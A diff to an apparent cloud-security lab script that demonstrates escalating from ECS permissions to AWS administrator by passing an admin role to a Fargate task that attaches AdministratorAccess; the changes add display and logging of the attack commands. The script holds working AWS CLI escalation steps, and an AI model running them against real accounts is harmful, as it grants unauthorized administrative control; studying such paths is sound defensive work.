@@ -4,7 +4,9 @@
 # This scenario demonstrates how a user with ECS permissions can escalate to admin by creating
 # a Fargate service with an admin role that modifies IAM permissions
 
-set -e
+
+# Disable AWS CLI paging
+export AWS_PAGER=""
 
 # Colors for output
 RED='\033[0;31m'
@@ -12,6 +14,24 @@ GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
 NC='\033[0m' # No Color
+
+# Dim color for command display
+DIM='\033[2m'
+CYAN='\033[0;36m'
+
+# Track attack commands for summary
+ATTACK_COMMANDS=()
+
+# Display a command before executing it
+show_cmd() {
+    echo -e "${DIM}\$ $*${NC}"
+}
+
+# Display AND record an attack command
+show_attack_cmd() {
+    echo -e "\n${CYAN}\$ $*${NC}"
+    ATTACK_COMMANDS+=("$*")
+}
 
 # Configuration
 STARTING_USER="pl-prod-ecs-001-to-admin-starting-user"
@@ -72,6 +92,7 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
+show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -83,6 +104,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
+show_cmd "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -90,6 +112,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 # Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
+show_cmd "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -101,6 +124,7 @@ echo ""
 echo -e "${YELLOW}Step 5: Creating ECS cluster${NC}"
 echo "Cluster name: $CLUSTER_NAME"
 
+show_attack_cmd "aws ecs create-cluster --region $AWS_REGION --cluster-name $CLUSTER_NAME --output json"
 aws ecs create-cluster \
     --region $AWS_REGION \
     --cluster-name $CLUSTER_NAME \
@@ -181,6 +205,7 @@ EOF
 )
 
 # Register the task definition
+show_attack_cmd "aws ecs register-task-definition --region $AWS_REGION --cli-input-json \"...\""
 TASK_DEF_ARN=$(aws ecs register-task-definition \
     --region $AWS_REGION \
     --cli-input-json "$TASK_DEFINITION" \
@@ -212,6 +237,7 @@ SERVICE_CONFIG=$(cat <<EOF
 EOF
 )
 
+show_attack_cmd "aws ecs create-service --region $AWS_REGION --cli-input-json \"...\""
 aws ecs create-service \
     --region $AWS_REGION \
     --cli-input-json "$SERVICE_CONFIG" \
@@ -309,6 +335,7 @@ echo -e "${GREEN}✓ Policy propagated${NC}\n"
 echo -e "${YELLOW}Step 12: Verifying administrator access${NC}"
 echo "Attempting to list IAM users..."
 
+show_cmd "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
@@ -329,6 +356,18 @@ echo "3. Registered task definition with admin role: $TARGET_ROLE_NAME"
 echo "4. Created Fargate service that launched privileged task"
 echo "5. Task attached AdministratorAccess policy to starting user"
 echo "6. Achieved: Full administrator access"
+
+echo -e "\n${YELLOW}Attack Path:${NC}"
+echo "  $STARTING_USER → (CreateCluster) → $CLUSTER_NAME"
+echo "  → (RegisterTaskDefinition + PassRole) → Task with $TARGET_ROLE_NAME"
+echo "  → (CreateService) → Task attaches admin policy → Admin"
+
+if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
+    echo -e "\n${YELLOW}Attack Commands:${NC}"
+    for cmd in "${ATTACK_COMMANDS[@]}"; do
+        echo -e "  ${CYAN}\$ ${cmd}${NC}"
+    done
+fi
 
 echo -e "\n${YELLOW}Attack Artifacts:${NC}"
 echo "- ECS cluster: $CLUSTER_NAME"
